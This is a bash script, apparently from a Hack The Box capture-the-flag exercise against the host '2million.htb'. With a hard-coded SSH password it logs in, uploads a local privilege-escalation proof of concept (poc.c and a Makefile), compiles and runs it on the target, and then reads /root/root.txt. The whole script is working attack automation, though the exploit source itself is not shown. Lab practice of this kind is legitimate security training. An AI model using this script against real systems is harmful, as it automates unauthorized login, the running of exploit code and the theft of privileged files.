#!/bin/bash

# Target SSH details
TARGET_HOST="2million.htb"
USER="admin"
PASS="SuperDuperPass123"

# Paths to exploit files on your local machine
LOCAL_POC_C="/home/kali/Desktop/poc.c"
LOCAL_MAKEFILE="/home/kali/Desktop/Makefile"

# Remote path to upload files
REMOTE_PATH="/tmp/exploit_files"


echo "[*] Making exploit files directory..."
sshpass -p $PASS ssh $USER@$TARGET_HOST "mkdir /tmp/exploit_files"
# Upload poc.c and Makefile to the target machine
echo "[*] Uploading poc.c and Makefile..."
sshpass -p $PASS scp $LOCAL_POC_C $LOCAL_MAKEFILE $USER@$TARGET_HOST:$REMOTE_PATH/

# Compile the exploit files on the target machine
echo "[*] Running 'make' to build the exploit on the target machine..."
sshpass -p $PASS ssh -t $USER@$TARGET_HOST "cd $REMOTE_PATH && make"

# Run the exploit to escalate privileges and fetch the root flag
echo "[*] Running exploit to escalate privileges..."
sshpass -p $PASS ssh -t $USER@$TARGET_HOST "cd $REMOTE_PATH && ./poc"

# Fetch root flag
echo "[*] Attempting to fetch root flag..."
ROOT_FLAG=$(sshpass -p $PASS ssh $USER@$TARGET_HOST "cat /root/root.txt")

